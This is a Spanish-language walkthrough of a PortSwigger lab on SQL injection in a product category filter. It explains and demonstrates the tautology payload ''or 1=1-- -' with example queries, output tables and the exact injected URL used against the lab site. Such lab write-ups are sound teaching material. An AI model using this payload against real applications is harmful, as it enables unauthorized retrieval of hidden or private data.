# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

- [Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

## Descripción:

This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

````sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
````

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

---

### Explicación:

### Query original:

El payload se inyecta en donde se pone el nombre del artículo o sección:

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/0b35f1ca-3c73-4837-a0f8-b5be87e084bf)

### Ejemplo con lab:

En realidad el query está diseñado para solo arrojar un resultado específico, por ejemplo:

````sql
# Ejemplo Original: 
select id,username from users where subscription = '1' and id = 5;
````
````py
# Arroja solo un resultado
   ## subscription = 1
   ## id = 5

+----+----------+
| id | username |
+----+----------+
|  5 | Ff0ur    |
+----+----------+
````

### Resultado final

- Con el payload `or 1 = 1-- -'` o `or 1 = 1'-- -` _(o alguna de sus variantes de comentarios)_ es como "romperé" el query:
- Es decir, con este payload le estoy pidiendo en la query que regrese el `id=5` (osea solo `Ff0ur`) o todo donde sea `1=1` (osea `true`)... osea todo!!! porque todo es true!!!!!! muahaha!! ;)

````sql
# Ejemplo Final: (ya con SQLi)
select id,username from users where subscription = '1' or 1 = 1;-- -' and id = 5 (aqui incluso puede ir otro query original que elimino, ya que es un comentario!!! :P);
````
````py
# Arroja todos los usernames y ids, sin condicionales!!
+----+----------+
| id | username |
+----+----------+
|  1 | Fz3r0    |
|  2 | F0n3     |
|  3 | Ftw0     |
|  4 | Fthr33   |
|  5 | Ff0ur    |
|  6 | Ff1v3    |
+----+----------+
````

- OJO! en consola de `mysql` se deben poner los `;`, pero en web no.

## Solución:

1. Abrir laboratorio

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/a56c4773-50c8-41b7-82b7-94631079ad1c)

2. Si filtro puedo empezar a ver el query desde la URL

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/4349813d-9f17-4542-9695-ed2d23113a01)

3. Query que usé

````sql
'or 1=1-- -
````
````http
https://0adf002604af55028177ed87004400b4.web-security-academy.net/filter?category=Lifestyle'or 1=1-- -
````

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/22e3492e-a7c7-4573-a966-73830aa681fe)



